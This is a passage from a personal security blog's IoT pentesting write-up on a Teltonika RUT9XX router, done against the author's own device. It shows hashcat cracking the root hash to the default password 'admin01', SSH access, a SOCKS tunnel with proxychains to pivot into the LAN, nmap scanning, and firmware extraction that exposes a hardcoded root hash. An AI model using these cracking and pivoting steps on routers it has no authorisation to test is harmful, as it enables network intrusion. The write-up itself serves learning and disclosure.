</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 500 hash.txt /usr/share/wordlists/rockyou.txt 

<span class="nv">$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1</span>:admin01
</pre></table></code></div></div><p>The root password is “admin01”. It’s the default one because we didn’t change it in the web interface</p><p>Now let’s try ssh to device</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>ssh root@192.168.1.1                                        
Unable to negotiate with 192.168.1.1 port 22: no matching host key <span class="nb">type </span>found. Their offer: ssh-rsa

</pre></table></code></div></div><p>A problem with the host key. Let’s use ssh-rsa</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-o</span> <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>ssh-rsa root@192.168.1.1 
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/72421091/180689385-e2d2a1c7-d2fc-48cc-a00f-285bca0c07fe.png" alt="Pasted image 20220724232345" data-proofer-ignore></p><p>We can use shell access to explore system files and services.</p><h1 id="pivoting-to-lan-network">Pivoting to Lan network</h1><p>We can use our ssh acces to create a tunnel and explore the lan network for real case scenario.</p><h2 id="ssh-tunneling"><span class="mr-2">SSH Tunneling</span><a href="#ssh-tunneling" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’m going to create a tunnel with the machine and configure proxychains to use it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-o</span> <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>ssh-rsa root@192.168.1.1 <span class="nt">-D</span> 9050 <span class="nt">-N</span> <span class="nt">-f</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>**-D**  

[bindaddress:]port  
Specifies a local ''dynamic'' application-level port forwarding. This works by allocating a socket to listen to _port_ on the local side, optionally bound to the specified _bind_address_. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and **ssh** will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
</pre></table></code></div></div><p>Now we need to add the socks proxy to proxychains</p><p><strong>/etc/proxychains4.conf</strong></p><p>In proxy lists at the end add :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>socks5  127.0.0.1 9050
</pre></table></code></div></div><p>Now let’s test the tunnel with a curl to the router web page.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>proxychains curl http://localhost
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.16
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.1//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"</span><span class="o">&gt;</span>
&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0; URL=/cgi-bin/luci"</span> /&gt;
&lt;/head&gt;
&lt;body <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color: white"</span><span class="o">&gt;</span>
&lt;a <span class="nv">style</span><span class="o">=</span><span class="s2">"color: white; text-decoration: none"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/cgi-bin/luci"</span><span class="o">&gt;</span>Wait <span class="k">for </span>configuration&lt;/a&gt;
&lt;/body&gt;
&lt;/html&gt;

</pre></table></code></div></div><p>Using nmap</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>proxychains nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span> localhost
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-07-24 21:19 EDT
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:22  ...  OK
Nmap scan report <span class="k">for </span>localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
Host is up <span class="o">(</span>0.0034s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     Dropbear sshd 2018.76 <span class="o">(</span>protocol 2.0<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</pre></table></code></div></div><p>We can use the router to send anything to the local network. For example let’s hit our webserver</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains curl http://192.168.1.110:8000
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
192.168.1.1 - - <span class="o">[</span>24/Jul/2022 21:20:46] <span class="s2">"GET / HTTP/1.1"</span> 200 -

</pre></table></code></div></div><p>As we can see 192.168.1.1 who did the resquest.</p><p>We can attack LAN network directly now, especially targets that can be accessed only locally.</p><h2 id="cli-interface"><span class="mr-2">CLI interface</span><a href="#cli-interface" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can test a CLI feature using a ssh tunnel from outside. It’s called “shellinabox”. We can run it form web interface / services / CLI.</p><p>If we look at ps from the ssh shell, we can see that a new service has been executed and it uses port 4200.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> 2838 nobody    1536 S    /usr/sbin/shellinaboxd --port=4200
 2842 nobody    1496 S    /usr/sbin/shellinaboxd --port=4200

</pre></table></code></div></div><p>Let’s use our tunnel to access the service</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains firefox 
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/72421091/180688598-de6c4df4-2536-4f68-8ef2-582325d2432f.png" alt="Pasted image 20220725025715" data-proofer-ignore></p><h1 id="firmware-analysis-at-end-x">Firmware analysis at end x)</h1><p>I’ll use binwalk to get more details about the firmware and extract files</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ binwalk RUT9XX_R_00.04.172_WEBUI.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
512           0x200           LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3626612 bytes
1192244       0x123134        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 10170504 bytes, 2700 inodes, blocksize: 262144 bytes, created: 2018-04-10 12:23:58

</pre></table></code></div></div><p>We can see that our system use Squashfs filesystem. Let’s extract the filesystem</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>binwalk <span class="nt">-e</span> RUT9XX_R_00.04.172_WEBUI.bin
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]
└─$ ls -la
total 64
drwxr-xr-x 16 kali kali 4096 Jul 24 22:02 .
drwxr-xr-x  4 kali kali 4096 Jul 24 22:02 ..
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 bin
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 dev
drwxr-xr-x 33 kali kali 4096 Jul 24 22:02 etc
drwxr-xr-x 13 kali kali 4096 Apr 10  2018 lib
lrwxrwxrwx  1 kali kali    9 Jul 24 22:02 log -&gt; /dev/null
drwxr-xr-x  3 kali kali 4096 Apr 10  2018 mnt
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 overlay
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 proc
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 rom
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 root
drwxr-xr-x  3 kali kali 4096 Apr 10  2018 sbin
drwxr-xr-x  2 kali kali 4096 Apr 10  2018 sys
drwxrwxrwt  2 kali kali 4096 Apr 10  2018 tmp
drwxr-xr-x  8 kali kali 4096 Apr 10  2018 usr
lrwxrwxrwx  1 kali kali    9 Jul 24 22:02 var -&gt; /dev/null
drwxr-xr-x  4 kali kali 4096 Apr 10  2018 www

</pre></table></code></div></div><p>As we see, this is the Linux filesystem. Let’s start by a quick check of the etc files.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]
└─$ cat etc/shadow  
root:$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1:15225:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::

</pre></table></code></div></div><p>For the shadow file we can see the same hash that we cracked early, It’s the same one because we did’nt change it.</p><p>If we start our study using firmware, we can see a security issue here with a hardcoded root password.</p><p>For more static research, i’ll use a tool called firmwalker https://github.com/craigz28/firmwalker</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root]
└─$ ./firmwalker.sh /home/kali/_RUT9XX_R_00.04.172_WEBUI.bin.extracted/squashfs-root output.txt
</pre></table></code></div></div><p>The tool used shodan so you need to init the api key (you can use the free one) or comment shodan commandes inside sh files.</p><p>The output gives a quick look at interesting files like config and sh files.</p><p>For more advanced tools, you can check FACT https://fkie-cad.github.io/FACT_core/</p><p><img data-src="https://user-images.githubusercontent.com/72421091/180851598-75f00ac0-c31f-4e0b-b180-b5d28f979fa5.png" alt="Pasted image 20220725032504" data-proofer-ignore></p><h1 id="conclusion">Conclusion</h1><p>There so much stuff to talk about it, analyze and maybe start digging for new CVEs with the recent firmware version but for today, this is all i got for you guys.</p><p>I hope you find this article useful (i know it’s boring xd ).</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/iot/'>IoT</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/fat/" class="post-tag no-text-decoration" >FAT</a> <a href="/tags/firmware/" class="post-tag no-text-decoration" >Firmware</a> <a href="/tags/router/" class="post-tag no-text-decoration" >router</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=IoT+Pentesting+with+Teltonika+RUT9XX+-+BaadMaro&url=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FIoT-Pentesting-with-Teltonika-RUT9XX%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=IoT+Pentesting+with+Teltonika+RUT9XX+-+BaadMaro&u=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FIoT-Pentesting-with-Teltonika-RUT9XX%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FIoT-Pentesting-with-Teltonika-RUT9XX%2F&text=IoT+Pentesting+with+Teltonika+RUT9XX+-+BaadMaro" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DGSSI-CTF-PRO-Italy-Writeup/">DGSSI CTF PRO 2024 - Italy Writeup</a><li><a href="/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/">Discourse CVE-2023-47119 - Building a CVE POC from commits changes</a><li><a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/">Android Applications Pentesting, Intentional Exercise from Hackerone platform</a><li><a href="/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/">Bypass captcha using OCR on Dolibarr login page</a><li><a href="/posts/IoT-Pentesting-with-Teltonika-RUT9XX/">IoT Pentesting with Teltonika RUT9XX</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/bug-bounty/">Bug Bounty</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dgssi/">DGSSI</a> <a class="post-tag" href="/tags/discourse/">Discourse</a> <a class="post-tag" href="/tags/dolibarr/">Dolibarr</a> <a class="post-tag" href="/tags/fat/">FAT</a> <a class="post-tag" href="/tags/firmware/">Firmware</a> <a class="post-tag" href="/tags/router/">router</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/"><div class="card-body"> <em class="small" data-ts="1658880000" data-df="ll" > Jul 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Android Applications Pentesting, Intentional Exercise from Hackerone platform</h3><div class="text-muted small"><p> Today we are going to practice some Android pentesting with a challenge made by Hackerone platform. I’ll explain different techniques used in Android pentesting with a practical overview. This ar...</p></div></div></a></div><div class="card"> <a href="/posts/DGSSI-CTF-PRO-Italy-Writeup/"><div class="card-body"> <em class="small" data-ts="1711411200" data-df="ll" > Mar 26, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DGSSI CTF PRO 2024 - Italy Writeup</h3><div class="text-muted small"><p> The lab was included in the professional DGSSI CTF hosed in SecDojo platform on February 7, 2024. https://www.linkedin.com/showcase/dgssi-ctf-2024/ Naples machine We start our enumeration wi...</p></div></div></a></div><div class="card"> <a href="/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/"><div class="card-body"> <em class="small" data-ts="1699833600" data-df="ll" > Nov 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Discourse CVE-2023-47119 - Building a CVE POC from commits changes</h3><div class="text-muted small"><p> I was checking for some Discourse vulnerabilities, and I saw that a new CVE was dropped on 11/10/2023 CVE-2023-47119 The details didn’t mention any POC, so I did some analysis based on the source...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/" class="btn btn-outline-primary" prompt="Newer"><p>Android Applications Pentesting, Intentional Exercise from Hackerone platform</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "BaadMaro/baadmaro.github.io", "data-repo-id": "R_kgDOHRG0bg", "data-category": "General", "data-category-id": "DIC_kwDOHRG0bs4CO51Z", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/BaadMaro">BaadMaro</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/bug-bounty/">Bug Bounty</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dgssi/">DGSSI</a> <a class="post-tag" href="/tags/discourse/">Discourse</a> <a class="post-tag" href="/tags/dolibarr/">Dolibarr</a> <a class="post-tag" href="/tags/fat/">FAT</a> <a class="post-tag" href="/tags/firmware/">Firmware</a> <a class="post-tag" href="/tags/router/">router</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-JHN65JPH4C"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-JHN65JPH4C'); }); </script>
